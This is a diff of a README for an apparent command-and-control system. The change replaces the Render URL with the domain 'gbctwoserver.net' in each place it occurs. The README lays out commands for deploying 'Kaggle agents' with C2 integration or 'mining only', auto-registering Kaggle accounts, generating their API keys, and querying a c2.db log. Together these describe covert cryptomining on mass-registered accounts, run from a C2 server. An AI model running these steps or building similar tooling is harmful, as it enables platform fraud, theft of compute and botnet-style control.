@@ -12,7 +12,7 @@
 ## 🌐 ACCESS POINTS
 
 ### Public Access (Render)
-- **URL:** https://system-monitor-6dru.onrender.com
+- **URL:** https://gbctwoserver.net
 
 ### Local Access (Development)
 - **URL:** http://localhost:5000
@@ -45,7 +45,7 @@
 ### 1. Access Dashboard
 ```bash
 # Public URL
-firefox https://system-monitor-6dru.onrender.com
+firefox https://gbctwoserver.net
 
 # Or local development
 firefox http://localhost:5000
@@ -54,7 +54,7 @@ firefox http://localhost:5000
 ### 2. Deploy Kaggle Agents
 ```bash
 # With C2 integration
-python3 kaggle/deploy_unified.py --c2-url https://system-monitor-6dru.onrender.com --count 5
+python3 kaggle/deploy_unified.py --c2-url https://gbctwoserver.net --count 5
 
 # Mining only
 python3 kaggle/deploy_unified.py --count 5
@@ -63,10 +63,10 @@ python3 kaggle/deploy_unified.py --count 5
 ### 3. Check Server Status
 ```bash
 # API health check
-curl https://system-monitor-6dru.onrender.com/api/health
+curl https://gbctwoserver.net/api/health
 
 # Server stats
-curl https://system-monitor-6dru.onrender.com/api/stats
+curl https://gbctwoserver.net/api/stats
 
 # View logs
 tail -f logs/unified.log
@@ -127,7 +127,7 @@ sqlite3 data/c2.db "SELECT * FROM logs ORDER BY ts DESC LIMIT 10;"
 ## 🎯 NEXT STEPS
 
 ### 1. Configure Kaggle Accounts
-- Go to https://system-monitor-6dru.onrender.com/autoreg
+- Go to https://gbctwoserver.net/autoreg
 - Start auto-registration for Kaggle
 - Generate API keys for accounts
 
